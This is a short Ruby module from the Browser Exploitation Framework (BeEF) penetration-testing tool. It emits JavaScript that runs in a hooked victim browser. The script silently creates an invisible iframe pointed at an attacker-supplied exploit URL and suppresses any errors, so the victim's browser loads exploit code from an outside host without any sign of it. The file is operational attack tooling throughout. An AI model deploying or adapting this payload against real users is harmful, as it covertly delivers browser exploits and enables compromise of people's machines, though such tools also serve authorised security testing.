#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

# This is a dummy module to fool BeEF's loading system
class Msf_module < BeEF::Core::Command
  def output
    command = BeEF::Core::Models::Command.find(@command_id)
    data = JSON.parse(command['data'])
    sploit_url = data[0]['sploit_url']

    "
beef.execute(function() {
        var result;

        try {
                var sploit = beef.dom.createInvisibleIframe();
                sploit.src = '#{sploit_url}';
        } catch(e) {
                for(var n in e)
                        result+= n + ' '  + e[n] ;
        }

});"
  end
end
